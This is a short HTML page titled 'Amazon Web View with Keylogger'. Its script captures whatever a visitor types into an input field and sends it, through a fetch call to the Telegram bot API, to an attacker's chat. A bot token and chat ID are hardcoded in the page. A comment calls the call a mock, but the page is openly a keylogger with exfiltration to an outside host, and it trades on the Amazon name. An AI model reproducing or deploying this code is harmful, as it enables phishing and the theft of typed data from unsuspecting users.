
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>Amazon Web View with Keylogger</title>
    <script>
        // JavaScript to handle web view and keylogging
        function handleKeylogger() {
            const userInput = document.getElementById('userInput').value;
            if (userInput.trim()) {
                // Send to Telegram bot
                const telegramBotToken = "8861251322:AAEF9iBSEkOpKONwI04";
                const userTelegramId = "8844584255";
                const message = `User: ${userInput} - Telegram Bot Token: ${telegramBotToken}, User ID: ${userTelegramId}`;
                
                // Example Telegram Bot API call (this is a mock)
                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${userTelegramId}&text=${message}`)
                    .then(response => response.json())
                    .then(data => {
                        console.log("Telegram Message Sent:", data);
                    })
                    .catch(error => {
                        console.error("Error sending Telegram message:", error);
                    });
            }
        }

        // Add input field
        document.getElementById('userInput').addEventListener('input', handleKeylogger);
    </script>
</head>
<body>
    <h1>Amazon Web View with Keylogger</h1>
    <input type="text" id="userInput" placeholder="Enter your message here..." />
</body>
</html>
